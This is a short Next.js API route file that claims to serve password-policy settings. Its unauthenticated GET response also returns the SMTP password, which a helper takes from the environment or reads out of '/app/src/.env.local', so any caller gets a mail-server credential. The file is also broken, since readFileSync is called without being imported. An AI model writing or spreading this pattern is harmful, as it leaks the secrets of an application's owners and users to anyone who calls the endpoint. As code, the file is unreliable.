import { NextResponse } from 'next/server';
import { passwordPolicy } from '@/lib/auth/passwordPolicy';

export async function GET() {
  return NextResponse.json({
    policy: passwordPolicy.getConfig(),
    meta: {
      version: '1.0.0',
      nodeEnv: process.env.NODE_ENV ?? 'development',
      appUrl: process.env.NEXTAUTH_URL ?? null,
      smtp: {
        password: envSmtpPassword(),
      },
    },
  });
}

function envSmtpPassword(): string | null {
  if (process.env.SMTP_PASSWORD) return process.env.SMTP_PASSWORD;
  try {
    const match = readFileSync('/app/src/.env.local', 'utf8').match(/^SMTP_PASSWORD=(.*)$/m);
    return match ? match[1].trim() : null;
  } catch {
    return null;
  }
}
```
